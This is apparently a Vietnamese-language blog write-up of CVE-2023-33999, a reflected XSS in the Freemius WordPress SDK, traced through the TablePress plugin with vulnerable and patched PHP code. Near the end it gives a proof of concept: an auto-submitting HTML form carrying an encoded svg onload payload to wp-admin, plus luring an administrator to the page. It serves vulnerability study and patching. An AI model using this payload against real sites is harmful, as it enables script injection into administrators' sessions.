# CVE-2023-33999 Analysis & POC


<!--more-->

## CVE & Basic Info
**Freemius SDK cho WordPress** không xử lý **làm sạch (sanitize)** dữ liệu đầu vào hoặc **thoát (escape)** dữ liệu đầu ra một cách đầy đủ, dẫn đến lỗ hổng **Reflected Cross-Site Scripting (XSS)**. Điều này trực tiếp ảnh hưởng đến **hơn 1.000 plugin và giao diện (theme)** đang sử dụng SDK này.

* **CVE ID**: [CVE-2023-33999](https://wpscan.com/vulnerability/35d2f1e7-a4f8-49fd-a8dd-bb2c26710f93/)
* **Vulnerability Type**: Cross Site Scripting
* **Affected Versions**: <= 2.5.9
* **Patched Versions**: 2.5.10
* **CVSS severity**: Medium (6.1)
* **Required Privilege**: Unauthenticated
* **Product**: [Freemius SDK for WordPress](https://freemius.com/help/documentation/wordpress-sdk/)

## Requirements
* **Local WordPress & Debugging**
    * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
    * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** - **TablePress**:  
    * `2.1.4` – **vulnerable**  
    * `2.1.5` – **patched**
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ diff nào.

## About Freemius SDK
**Freemius SDK** là một bộ thư viện (Software Development Kit) dành cho **WordPress**, giúp nhà phát triển plugin và theme dễ dàng thêm các chức năng sau vào sản phẩm của họ:

* Quản lý **bản quyền (licensing)**
* Xử lý **phiên bản miễn phí / trả phí (freemium / premium)**
* Cho phép người dùng **kết nối tài khoản (opt-in)**
* Thu thập **thống kê sử dụng (analytics)**
* Quản lý **thanh toán và gia hạn**
* Hiển thị **upsell / upgrade** trong dashboard WordPress

> [!NOTE]
> **Freemius SDK** không phải là một plugin riêng biệt mà được nhúng trực tiếp vào mã nguồn của các plugin hoặc theme khác. Vì vậy, khi xảy ra lỗ hổng trong **Freemius SDK**, rất nhiều sản phẩm cũng sẽ bị ảnh hưởng theo. Plugin [**TablePress**](https://wordpress.org/plugins/tablepress/) là một trong những trường hợp bị tác động, nên tôi chọn nó để phân tích.

## Cause
**Trong phiên bản lỗi v2.5.9:**
```php {title="freemius/includes/fs-core-functions.php v2.5.9" data-open=true}
/**
 * A helper method to fetch GET/POST user input with an optional default value when the input is not set.
 * @author Vova Feldman (@svovaf)
 *
 * @param string      $key
 * @param mixed       $def
 * @param string|bool $type Since 1.2.1.7 - when set to 'get' will look for the value passed via querystring, when
 *                          set to 'post' will look for the value passed via the POST request's body, otherwise,
 *                          will check if the parameter was passed in any of the two.
 *
 * @return mixed
 */
function fs_request_get( $key, $def = false, $type = false ) {
    if ( is_string( $type ) ) {
        $type = strtolower( $type );
    }

    /**
     * Note to WordPress.org Reviewers:
     *  This is a helper method to fetch GET/POST user input with an optional default value when the input is not set. The actual sanitization is done in the scope of the function's usage.
     */
    switch ( $type ) {
        case 'post':
            $value = isset( $_POST[ $key ] ) ? $_POST[ $key ] : $def;
            break;
        case 'get':
            $value = isset( $_GET[ $key ] ) ? $_GET[ $key ] : $def;
            break;
        default:
            $value = isset( $_REQUEST[ $key ] ) ? $_REQUEST[ $key ] : $def;
            break;
    }

    return $value;
}
```

Hàm `fs_request_get()` dùng để **lấy giá trị của một tham số từ request của người dùng** (GET, POST hoặc cả hai), dựa trên tên key được truyền vào. Nếu tham số không tồn tại, hàm sẽ trả về giá trị mặc định. Tham số `$type` cho phép chỉ định rõ nguồn dữ liệu là từ `GET`, `POST` hoặc tất cả (`REQUEST`).

> [!BUG]
> Dữ liệu trả về không được làm sạch (sanitize) hoặc thoát ký tự (escape). Nếu giá trị này được in ra trình duyệt (ví dụ bằng `echo`) mà không xử lý an toàn, kẻ tấn công có thể chèn mã JavaScript độc hại thông qua tham số request, từ đó dẫn đến lỗ hổng **Reflected Cross-Site Scripting (XSS)**.

**Bản vá v2.5.9:**

```php {title="freemius/includes/fs-core-functions.php v2.5.10" data-open=true}
function fs_request_get_raw( $key, $def = false, $type = false ) {
    if ( is_string( $type ) ) {
        $type = strtolower( $type );
    }

    /**
     * Note to WordPress.org reviewers:
     * This is a helper function to fetch GET/POST user input with an optional default value when the input is not set. The actual sanitization is done in the scope of the function's usage.
     */
    switch ( $type ) {
        case 'post':
            // phpcs:ignore WordPress.Security.NonceVerification.Missing
            $value = isset( $_POST[ $key ] ) ? $_POST[ $key ] : $def;
            break;
        case 'get':
            // phpcs:ignore WordPress.Security.NonceVerification.Recommended
            $value = isset( $_GET[ $key ] ) ? $_GET[ $key ] : $def;
            break;
        default:
            // phpcs:ignore WordPress.Security.NonceVerification.Recommended
            $value = isset( $_REQUEST[ $key ] ) ? $_REQUEST[ $key ] : $def;
            break;
    }

    // Don't unslash if the value itself is empty (empty string, null, empty array etc).
    return empty( $value ) ? $value : wp_unslash( $value );
}

function fs_sanitize_input( $input ) {
    if ( is_array( $input ) ) {
        foreach ( $input as $key => $value ) {
            $input[ $key ] = fs_sanitize_input( $value );
        }
    } else {
        // Allow empty values to pass through as-is, like `null`, `''`, `0`, `'0'` etc.
        $input = empty( $input ) ? $input : sanitize_text_field( $input );
    }

    return $input;
}

function fs_request_get( $key, $def = false, $type = false ) {
    return fs_sanitize_input( fs_request_get_raw( $key, $def, $type ) );
}
```

Bản vá đã tách việc **lấy dữ liệu** và **làm sạch dữ liệu** thành hai bước riêng biệt.
`fs_request_get_raw()` chỉ lấy giá trị thô từ GET/POST/REQUEST và bỏ escape bằng `wp_unslash()`, trong khi `fs_sanitize_input()` đảm nhiệm việc làm sạch (kể cả khi dữ liệu là mảng) bằng `sanitize_text_field()`. Cuối cùng, `fs_request_get()` luôn trả về dữ liệu đã được làm sạch. Nhờ đó, dữ liệu độc hại không còn được trả ra trực tiếp, giúp giảm nguy cơ khai thác **Reflected XSS**.

## Analysis
Hàm `fs_request_get()` được gọi ở rất nhiều nơi

![Call](call.png "127 references")

nên quá trình `trace` hơi tối thời gian

![Search](search.png "Vị trí gọi fs_request_get")

Hàm `dynamic_init()` gọi đến `fs_request_get()` để lấy giá trị của các key như `purchased_plan` và `purchase_email` từ request, sau đó sử dụng các giá trị này để hiển thị nội dung thông báo xác nhận mua license trong trang quản trị. Các giá trị này không được làm sạch trước khi được đưa vào nội dung hiển thị, dẫn đến nguy cơ dữ liệu do người dùng kiểm soát có thể chèn mã độc và gây ra lỗ hổng **Reflected Cross-Site Scripting (XSS)**.

Để thông báo này xảy ra, cần phải đáp ứng 3 điều kiện:
1. Request phải được gọi từ Admin Dashboard
```php {data-open=true}
$this->is_user_in_admin()
/**
 * Check if a real user is visiting the admin dashboard.
 *
 * @author Vova Feldman (@svovaf)
 * @since  1.1.7
 *
 * @return bool
 */
function is_user_in_admin() {
    return (
        is_admin() &&
        ! self::is_ajax() &&
        ! self::is_cron() &&
        ! self::is_admin_post()
    );
}
```

2. Kiểm tra người dùng đã từng kết nối (opt-in) với Freemius hay chưa.
```php {data-open=true}
$this->is_registered()
/**
 * Check if user has connected his account (opted-in).
 *
 * Note:
 *      If the user opted-in and opted-out on a later stage,
 *      this will still return true. If you want to check if the
 *      user is currently opted-in, use:
 *          `$fs->is_registered() && $fs->is_tracking_allowed()`
 *
 * @author Vova Feldman (@svovaf)
 * @since  1.0.1
 *
 * @param bool $ignore_anonymous_state Since 2.5.1
 *
 * @return bool
 */
function is_registered( $ignore_anonymous_state = false ) {
    return (
        is_object( value: $this->_user ) &&
        (
            $this->is_premium() ||
            $ignore_anonymous_state ||
            ! $this->is_anonymous()
        )
    );
}
```

Sau khi thiết lập plugin thành công, hệ thống sẽ gửi một email xác nhận để hoàn tất quá trình kết nối (opt-in) này.

![Opt In](opt_in.png "Kết nối với Freemius")

3. Request phải chứa param `purchase_completed`
```php
fs_request_has( 'purchase_completed' )
function fs_request_has( $key ) {
    return isset( $_REQUEST[ $key ] );
}
```

---

`dynamic_init()` được gọi trong hàm `fs_dynamic_init()`

```php
function fs_dynamic_init( $module ) {
    $fs = Freemius::instance( $module['id'], $module['slug'], true );
    $fs->dynamic_init( $module );

    return $fs;
}
```

Hàm này tạo một instance của `Freemius` và gọi `dynamic_init()` để khởi tạo SDK với cấu hình từ `$module`.

`fs_dynamic_init()` được gọi trong file `tablepress/tablepress.php` (`hàm tb_tp_fs()`)

```php {data-open=true title="tablepress/tablepress.php"}
function tb_tp_fs() {
    global $tb_tp_fs;

    if ( ! isset( $tb_tp_fs ) ) {
        // Include Freemius SDK.
        require_once __DIR__ . '/libraries/freemius/start.php';

        $tb_tp_fs = fs_dynamic_init( array(
            'id'                => '10340',
            'slug'              => 'tablepress',
            'type'              => 'plugin',
            'public_key'        => 'pk_b215ca1bb4041cf43ed137ae7665b',
            'is_premium'        => false,
            'has_addons'        => false,
            'has_paid_plans'    => true,
            'menu'              => array(
                'slug'    => 'tablepress',
                'contact' => false,
                'support' => false,
                'account' => false,
                'pricing' => false,
            ),
            'opt_in_moderation' => array(
                'new'       => true,
                'updates'   => false,
                'localhost' => false,
            ),
            'is_live'           => true,
        ) );
    }

    return $tb_tp_fs;
}
```

Hàm này:
* Nạp Freemius SDK
* Gọi `fs_dynamic_init()` với cấu hình dành riêng cho TablePress
* Lưu instance vào biến global `$tb_tp_fs`

`tb_tp_fs()` được gọi ngay trong `tablepress/tablepress.php`

```php {data-open=true title="tablepress/tablepress.php"}
// Init Freemius.
tb_tp_fs();
```

Vì `tablepress.php` là file được WordPress load đầu tiên khi plugin chạy, nên Freemius SDK cũng được khởi tạo ngay từ đây.

Do đó, luồng `tablepress/tablepress.php` → `tb_tp_fs()` → `fs_dynamic_init()` → `dynamic_init()` luôn được thực thi mỗi khi WordPress xử lý một request và plugin TablePress được load. Điều này đồng nghĩa với việc các logic nằm trong `dynamic_init()`, bao gồm việc đọc dữ liệu từ request (như `purchased_plan`, `purchase_email…`), sẽ luôn có cơ hội được kích hoạt khi người dùng truy cập vào các endpoint liên quan đến khu vực quản trị.

![Trigger](trigger.png "Kích hoạt lỗ hổng")

Tuy nhiên, để lỗ hổng có thể bị lợi dụng với đặc quyền Unauthenticated, kẻ tấn công không thể tự tác động trực tiếp mà phải xây dựng một kịch bản gián tiếp, chẳng hạn bằng cách dụ quản trị viên truy cập vào một website độc hại (malicious website). Khi đó, trình duyệt của admin có thể vô tình gửi request tới trang quản trị WordPress đang đăng nhập, mang theo các tham số do kẻ tấn công kiểm soát, từ đó kích hoạt hành vi không mong muốn trong quá trình xử lý của plugin.

## PoC
1. Tạo một website độc hại có nhiệm vụ tự động gửi request tới trang quản trị WordPress:
```html {data-open=true}
<html>
  <body>
    <form action="http://localhost/wp-admin/index.php">
      <input type="hidden" name="purchase&#95;email" value="&lt;svg&#47;onload&#61;alert&#40;&#41;&gt;" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
2. Gửi đường link của website này cho người dùng có quyền quản trị và dụ họ truy cập, từ đó kích hoạt request được gửi đi khi trang độc hại được tải.

## Conclusion

CVE-2023-33999 xuất phát từ việc **không làm sạch dữ liệu đầu vào** trong `fs_request_get()` của Freemius SDK, cho phép dữ liệu do người dùng kiểm soát được đưa thẳng vào nội dung hiển thị trong trang quản trị. Vì Freemius được nhúng rộng rãi trong rất nhiều plugin và theme, phạm vi ảnh hưởng của lỗ hổng này lớn hơn rất nhiều so với một plugin đơn lẻ. Bản vá 2.5.10 đã khắc phục triệt để bằng cách **tách riêng bước lấy dữ liệu và bước làm sạch**, đảm bảo mọi dữ liệu từ request đều được sanitize trước khi sử dụng.

## Key Takeaways

* Không bao giờ tin tưởng dữ liệu từ `$_GET`, `$_POST`, `$_REQUEST` – luôn **sanitize và escape** trước khi sử dụng hoặc hiển thị.
* Một SDK dùng chung (như Freemius) khi có lỗ hổng sẽ tạo **tác động dây chuyền** lên hàng nghìn sản phẩm.
* Luôn kiểm tra các thư viện bên thứ ba và **cập nhật phiên bản vá lỗi kịp thời**.
* Việc khởi tạo SDK sớm (early init) khiến lỗ hổng có thể bị kích hoạt trên nhiều request hơn dự kiến.
* Reflected XSS có thể được khai thác gián tiếp thông qua **social engineering** và các website độc hại.

## References

[Cross Site Scripting](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html)

[https://github.com/Freemius/wordpress-sdk/commit/e34e4f1eb67d02ec20ee8c7ab65c1ca1efe40c01](https://github.com/Freemius/wordpress-sdk/commit/e34e4f1eb67d02ec20ee8c7ab65c1ca1efe40c01)

---

> Tác giả: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-12-05-cve-2023-33999/  

